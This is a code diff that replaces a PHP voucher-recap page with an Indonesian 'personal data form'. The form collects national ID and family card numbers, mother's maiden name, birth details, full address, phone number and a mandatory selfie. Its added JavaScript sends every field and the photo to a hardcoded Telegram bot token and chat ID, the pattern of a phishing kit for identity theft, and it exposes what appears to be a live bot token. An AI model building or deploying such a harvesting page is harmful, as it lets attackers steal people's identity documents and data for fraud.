@@ -1,303 +1,256 @@
-<?php
-    $file = "rekapan.txt";
-    $harga_vbe = [
-        '25K' => [
-            'face' => 25000,
-            'beli' => 21500
-        ],
-        '50K' => [
-            'face' => 50000,
-            'beli' => 45000
-        ],
-        '100K' => [
-            'face' => 100000,
-            'beli' => 90000
-        ]
-    ];
-
-    // Rate jual
-    $rate = [
-        'IDM' => 0.97,    // Indomaret
-        'ALFA' => [
-            '25K' => 0.95,
-            '50K' => 0.96,
-            '100K' => 0.96
-        ]
-    ];
-
-    if (isset($_GET['clear'])) {
-        $selectedPackage = $_GET['package'] ?? 'all';
-        
-        if (file_exists($file)) {
-            $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-            $remaining = [];
-            
-            foreach ($lines as $line) {
-                // Hapus hanya yang sesuai dengan package yang dipilih
-                if ($selectedPackage === 'all' || strpos($line, "Voucher: $selectedPackage") !== false) {
-                    continue;
-                }
-                $remaining[] = $line;
-            }
-            
-            // Update file dengan data yang tersisa
-            if (empty($remaining)) {
-                unlink($file);
-            } else {
-                file_put_contents($file, implode("\n", $remaining));
-            }
-        }
-        
-        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
-        exit();
-    }
-
-    if (isset($_POST['submit'])) {
-        $selected_vbes = $_POST['vbe_selection'] ?? [];
-        $voucher_codes = array_filter(array_map('trim', explode("\n", $_POST['voucher_code'] ?? '')));
-        
-        // Validasi pilihan voucher
-        if (empty($selected_vbes)) {
-            die("Error: Silakan pilih minimal satu jenis voucher");
-        }
-        
-        // Validasi jumlah kode
-        if (count($voucher_codes) < 1) {
-            die("Error: Silakan masukkan minimal satu kode voucher");
-        }
-        
-        foreach ($selected_vbes as $vbe_name) {
-            foreach ($voucher_codes as $code) {
-                file_put_contents($file, date("Y-m-d H:i:s") . " | Voucher: " . htmlspecialchars($vbe_name) . " | Kode Voucher: " . htmlspecialchars($code) . "\n", FILE_APPEND);
-            }
-        }
-        
-        header('Location: ' . $_SERVER['REQUEST_URI']);
-        exit();
-    }
-?>
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rekapan VBE</title>
-    <link rel="stylesheet" href="style.css">
-    <script>
-        function showVoucherInput() {
-            document.getElementById('voucher_section').classList.remove('hidden');
+    <title>Formulir Data Pribadi</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         }
-
-        function copyVouchers() {
-            let selectedPackage = document.getElementById('copy_selection').value;
-            let vouchers = document.querySelectorAll('.voucher-code');
-            let voucherText = "";
-            let packageMap = new Map();
-
-            // Group vouchers by package
-            vouchers.forEach(v => {
-                let packageName = v.getAttribute('data-package');
-                if (selectedPackage === "all" || packageName === selectedPackage) {
-                    if (!packageMap.has(packageName)) {
-                        packageMap.set(packageName, []);
-                    }
-                    packageMap.get(packageName).push(v.innerText);
-                }
-            });
-
-            // Build text format dengan nomor urut
-            packageMap.forEach((codes, packageName) => {
-                voucherText += `Kode Voucher ${packageName}:\n`;
-                voucherText += codes.map((code, index) => `${index + 1}. ${code}`).join('\n') + '\n\n';
-            });
-
-            voucherText = voucherText.trim();
-
-            if (!voucherText) {
-                alert("Tidak ada kode voucher untuk Voucher yang dipilih.");
-                return;
-            }
-
-            navigator.clipboard.writeText(voucherText).then(() => {
-                alert(`Kode voucher telah disalin dengan nomor urut!`);
-                window.location.href = `?clear=1&package=${encodeURIComponent(selectedPackage)}`;
-            }).catch(err => {
-                alert("Gagal menyalin, coba secara manual.");
-            });
+        form {
+            max-width: 600px;
+            margin: 20px auto;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
         }
-
-        function updateVoucherSection() {
-            const checkboxes = document.querySelectorAll('input[type="checkbox"]:checked');
-            const voucherCodes = document.getElementById('voucher_code').value.split('\n').filter(c => c.trim() !== '');
-            
-            const voucherSection = document.getElementById('voucher_section');
-            if (checkboxes.length > 0) {
-                voucherSection.classList.remove('hidden');
-            } else {
-                voucherSection.classList.add('hidden');
-            }
+        h2 {
+            color: #2d3748;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2em;
         }
-
-        // Hapus event listener untuk textarea
-        document.getElementById('voucher_code').removeEventListener('input', updateVoucherSection);
-
-        // Tambahkan event listener saat halaman dimuat
-        document.addEventListener('DOMContentLoaded', function() {
-            updateVoucherSection(); // Jalankan validasi awal
-        });
-    </script>
+        label {
+            display: block;
+            margin: 15px 0 5px;
+            color: #4a5568;
+            font-weight: 600;
+            background: linear-gradient(45deg, #4a5568, #2d3748);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background-color: #f7fafc;
+        }
+        input:focus, select:focus, textarea:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+            background-color: white;
+            outline: none;
+        }
+        button {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            width: 100%;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        .required::after {
+            content: " *";
+            color: #e53e3e;
+        }
+        .hidden {
+            display: none;
+        }
+        #telegramMessage {
+            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 600px;
+            margin: 20px auto;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+    </style>
 </head>
 <body>
+    <form id="dataForm" enctype="multipart/form-data">
+        <h2>Formulir Data Pribadi</h2>
 
-    <h2>Rekapan VBE</h2>
+        <label for="nik" class="required">Nomor Identitas Kependudukan</label>
+        <input type="text" id="nik" name="nik" required>
 
-    <form action="" method="POST">
-        <label>Pilih Jenis Voucher:</label>
-        <div class="checkbox-group">
-            <!-- VBE IDM -->
-            <label class="checkbox-label vbe-idm">
-                <input type="checkbox" name="vbe_selection[]" value="VBE IDM 25K" onchange="updateVoucherSection()">
-                VBE IDM 25K
-            </label>
-            <label class="checkbox-label vbe-idm">
-                <input type="checkbox" name="vbe_selection[]" value="VBE IDM 50K" onchange="updateVoucherSection()">
-                VBE IDM 50K
-            </label>
-            <label class="checkbox-label vbe-idm">
-                <input type="checkbox" name="vbe_selection[]" value="VBE IDM 100K" onchange="updateVoucherSection()">
-                VBE IDM 100K
-            </label>
-            
-            <!-- VBE ALFA -->
-            <label class="checkbox-label vbe-alfa">
-                <input type="checkbox" name="vbe_selection[]" value="VBE ALFA 25K" onchange="updateVoucherSection()">
-                VBE ALFA 25K
-            </label>
-            <label class="checkbox-label vbe-alfa">
-                <input type="checkbox" name="vbe_selection[]" value="VBE ALFA 50K" onchange="updateVoucherSection()">
-                VBE ALFA 50K
-            </label>
-            <label class="checkbox-label vbe-alfa">
-                <input type="checkbox" name="vbe_selection[]" value="VBE ALFA 100K" onchange="updateVoucherSection()">
-                VBE ALFA 100K
-            </label>
-        </div>
+        <label for="agama" class="required">Agama</label>
+        <select id="agama" name="agama" required>
+            <option value="">--Pilih Agama--</option>
+            <option value="Islam">Islam</option>
+            <option value="Kristen">Kristen</option>
+            <option value="Katolik">Katolik</option>
+            <option value="Hindu">Hindu</option>
+            <option value="Buddha">Buddha</option>
+            <option value="Konghucu">Konghucu</option>
+        </select>
 
-        <div id="voucher_section" class="hidden">
-            <label for="voucher_code">Masukkan Kode Voucher (satu per baris):</label>
-            <textarea name="voucher_code" id="voucher_code" required placeholder="Contoh: 
-ABC123
-DEF456"></textarea>
-            
-            <button type="submit" name="submit">Simpan</button>
-        </div>
+        <label for="status_hubungan" class="required">Status Hubungan Keluarga</label>
+        <select id="status_hubungan" name="status_hubungan" required>
+            <option value="">--Pilih Status Hubungan--</option>
+            <option value="Anak">Anak</option>
+            <option value="Istri">Istri</option>
+            <option value="Kepala Keluarga">Kepala Keluarga</option>
+        </select>
+
+        <label for="nama_wajib_pajak" class="required">Nama Wajib Pajak</label>
+        <input type="text" id="nama_wajib_pajak" name="nama_wajib_pajak" required>
+
+        <label for="tanggal_lahir" class="required">Tanggal Lahir</label>
+        <input type="date" id="tanggal_lahir" name="tanggal_lahir" required>
+
+        <label for="jenis_kelamin" class="required">Jenis Kelamin</label>
+        <select id="jenis_kelamin" name="jenis_kelamin" required>
+            <option value="">--Pilih Jenis Kelamin--</option>
+            <option value="Laki-laki">Laki-laki</option>
+            <option value="Perempuan">Perempuan</option>
+        </select>
+
+        <label for="nama_ibu_kandung" class="required">Nama Ibu Kandung</label>
+        <input type="text" id="nama_ibu_kandung" name="nama_ibu_kandung" required>
+
+        <label for="tempat_lahir" class="required">Tempat Lahir</label>
+        <input type="text" id="tempat_lahir" name="tempat_lahir" required>
+
+        <label for="status_perkawinan" class="required">Status Perkawinan</label>
+        <select id="status_perkawinan" name="status_perkawinan" required>
+            <option value="">--Pilih Status Perkawinan--</option>
+            <option value="Belum Menikah">Belum Menikah</option>
+            <option value="Menikah">Menikah</option>
+            <option value="Cerai Hidup">Cerai Hidup</option>
+            <option value="Cerai Mati">Cerai Mati</option>
+        </select>
+
+        <label for="nomor_kk" class="required">Nomor Kartu Keluarga</label>
+        <input type="text" id="nomor_kk" name="nomor_kk" required>
+
+        <label for="email">E-mail Aktif</label>
+        <input type="email" id="email" name="email">
+
+        <label for="nomor_handphone" class="required">Nomor Handphone (Minimal ada pulsa 5k)</label>
+        <input type="tel" id="nomor_handphone" name="nomor_handphone" required>
+
+        <label for="alamat" class="required">Detail Alamat</label>
+        <textarea id="alamat" name="alamat" rows="3" required></textarea>
+
+        <label for="rt_rw" class="required">RT/RW</label>
+        <input type="text" id="rt_rw" name="rt_rw" required>
+
+        <label for="provinsi" class="required">Provinsi</label>
+        <input type="text" id="provinsi" name="provinsi" required>
+
+        <label for="kota" class="required">Kota/Wilayah</label>
+        <input type="text" id="kota" name="kota" required>
+
+        <label for="kecamatan" class="required">Kecamatan</label>
+        <input type="text" id="kecamatan" name="kecamatan" required>
+
+        <label for="desa" class="required">Desa/Kelurahan</label>
+        <input type="text" id="desa" name="desa" required>
+
+        <label for="kode_wilayah" class="required">Kode Wilayah</label>
+        <input type="text" id="kode_wilayah" name="kode_wilayah" required>
+
+        <label for="kode_pos" class="required">Kode Pos</label>
+        <input type="text" id="kode_pos" name="kode_pos" required>
+
+        <label for="selfie" class="required">Upload Gambar Selfie (Wajib)</label>
+        <input type="file" id="selfie" name="selfie" accept="image/*" required>
+
+        <button type="submit">Submit</button>
     </form>
 
-    <?php
-    // Tampilkan isi rekapan.txt jika ada
-    if (file_exists($file)) {
-        echo "<div class='rekapan-container'>";
-        echo "<h2>Data Rekapan</h2>";
-        
-        $file_contents = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $unique_packages = ["all" => "Semua Voucher"];
-        $total_keseluruhan = 0;
-        $counter = [];
+    <div id="telegramMessage" class="hidden">
+        <h3>Data Telah Dikirim ke Telegram</h3>
+        <p>Terima kasih! Data Anda telah dikirim melalui Telegram.</p>
+    </div>
 
-        echo "<table border='1' cellpadding='5' style='margin-bottom: 20px;'>";
-        echo "<tr><th>Tipe</th><th>Voucher</th><th>Jumlah</th><th>Total Harga</th><th>Harga Jual</th></tr>";
+    <script>
+        document.getElementById('dataForm').addEventListener('submit', function(event) {
+            event.preventDefault();
 
-        foreach ($file_contents as $line) {
-            if (preg_match("/Voucher: VBE (ALFA|IDM) (\d+[K])/i", $line, $matches)) {
-                $type = trim($matches[1]);
-                $jenis = trim($matches[2]);
-                $counter[$type][$jenis] = ($counter[$type][$jenis] ?? 0) + 1;
-            }
-        }
+            const formData = new FormData(this);
 
-        // Variabel total
-        $total_pendapatan = 0;
-        
-        // Tampilkan per jenis dan tipe
-        foreach (['IDM', 'ALFA'] as $type) {
-            $type_total = 0;
-            $type_pendapatan = 0;
+            // Simulate sending data to Telegram
+            const telegramBotToken = '8134326547:AAH8IKTtrDV5NRH3Yt_jcxBzot_TuVJGu3k'; // Ganti dengan bot token Anda
+            const chatId = '156619417'; // Ganti dengan chat ID Anda
+
+            // Format pesan dengan mobospace
+            let message = "🐯 *DATA FORMULIR* 🐯\n";
+            message += "━━━━━━━━━━━━━━━━━━━━\n";
             
-            foreach ($harga_vbe as $jenis => $details) {
-                $jumlah = $counter[$type][$jenis] ?? 0;
-                if($jumlah > 0) {
-                    $total = $jumlah * $details['face'];
-                    // Sesuaikan perhitungan rate berdasarkan tipe
-                    if($type == 'IDM') {
-                        $pendapatan = $total * $rate['IDM']; // Rate flat 0.97 untuk IDM
-                    } else {
-                        // Untuk ALFA, ambil rate sesuai nominal voucher
-                        $pendapatan = $total * $rate['ALFA'][$jenis]; // 25K=0.95, 50K/100K=0.96
-                    }
-                    
-                    $type_total += $total;
-                    $type_pendapatan += $pendapatan;
-                    
-                    $total_keseluruhan += $total;
-                    $total_pendapatan += $pendapatan;
-                    
-                    echo "<tr>";
-                    echo "<td data-label='Tipe'><span class='vbe-$type'>VBE $type</span></td>";
-                    echo "<td data-label='Voucher'>$jenis</td>";
-                    echo "<td data-label='Jumlah'>$jumlah x</td>";
-                    echo "<td data-label='Total Harga'>Rp " . number_format($total, 0, ',', '.') . "</td>";
-                    echo "<td data-label='Harga Jual'>Rp " . number_format($pendapatan, 0, ',', '.') . "</td>";
-                    echo "</tr>";
+            for (let [key, value] of formData.entries()) {
+                if (key !== 'selfie') {
+                    message += `*${key.replace(/_/g, ' ').toUpperCase()}*: \`${value}\`\n`;
                 }
             }
             
-            if($type_total > 0) {
-                echo "<tr style='background:#f8f8f8;' class='total-".strtolower($type)."'>";
-                echo "<td colspan='3'>Total $type</td>";
-                echo "<td>Rp " . number_format($type_total, 0, ',', '.') . "</td>";
-                echo "<td>Rp " . number_format($type_pendapatan, 0, ',', '.') . "</td>";
-                echo "</tr>";
-            }
-        }
+            message += "━━━━━━━━━━━━━━━━━━━━\n";
+            message += "✅ *DATA TELAH TERKIRIM* ✅";
 
-        echo "<tr class='grand-total'>";
-        echo "<td colspan='3'>TOTAL KESELURUHAN</td>";
-        echo "<td>Rp " . number_format($total_keseluruhan, 0, ',', '.') . "</td>";
-        echo "<td style='background:#2ecc71;color:white;'>Rp " . number_format($total_pendapatan, 0, ',', '.') . "</td>";
-        echo "</tr>";
-        echo "</table>";
+            // Kirim pesan teks pertama
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'MarkdownV2'
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Gagal mengirim pesan teks ke Telegram.');
+                }
+                return response.json();
+            })
+            .then(() => {
+                // Send the image next
+                const selfieFile = formData.get('selfie');
+                const photoData = new FormData();
+                photoData.append('chat_id', chatId);
+                photoData.append('photo', selfieFile);
 
-        echo "<pre id='voucher_list'>";
-        
-        $file_contents = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $unique_packages = ["all" => "Semua Voucher"];
-
-        foreach ($file_contents as $line) {
-            echo "$line\n";
-
-            if (preg_match("/Voucher: (.*?) \| Kode Voucher: (.*)/", $line, $matches)) {
-                $package = trim($matches[1]);
-                $voucher = trim($matches[2]);
-                $type = strpos($package, 'IDM') !== false ? 'idm' : 'alfa';
-                echo "<div class='voucher-code hidden' data-package='$package'><span class='vbe-$type'>$voucher</span></div>";
-                $unique_packages[$package] = $package;
-            }
-        }
-
-        echo "</pre>";
-
-        // Dropdown pilihan Voucher sebelum menyalin
-        echo "<label for='copy_selection'>Pilih Voucher untuk Disalin:</label>";
-        echo "<select id='copy_selection'>";
-        foreach ($unique_packages as $key => $value) {
-            echo "<option value='$key'>$value</option>";
-        }
-        echo "</select>";
-
-        echo "<button class='copy-btn' onclick='copyVouchers()'>Salin Kode Voucher</button>";
-        echo "</div>";
-    }
-    ?>
-
+                return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: photoData
+                });
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('dataForm').classList.add('hidden');
+                    document.getElementById('telegramMessage').classList.remove('hidden');
+                } else {
+                    throw new Error('Gagal mengirim gambar ke Telegram.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Terjadi kesalahan saat mengirim data. Silakan coba lagi.');
+            });
+        });
+    </script>
 </body>
 </html>
